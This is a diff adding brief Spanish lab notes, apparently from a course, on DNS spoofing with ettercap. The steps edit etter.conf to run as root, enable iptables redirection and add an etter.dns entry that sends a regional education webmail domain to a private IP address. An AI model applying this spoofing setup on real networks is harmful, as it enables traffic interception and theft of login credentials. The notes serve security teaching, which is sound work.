@@ -1,0 +1,23 @@
+dnsspoof con ettercap
+Requisitos de finalización
+editar etcettercapetter.conf
+
+poner
+
+ec_uid=0
+
+ec_gid=0
+
+descomentar
+
+redir_command_on= iptables ...
+
+redir_command_off=iptables ...
+
+y su version ipv6
+
+se guarda y vamos al archivo etcettercapetter.dns
+
+Añadimos por ejemplo
+
+correoweb.educa.madrid.org A 10.227.87.250
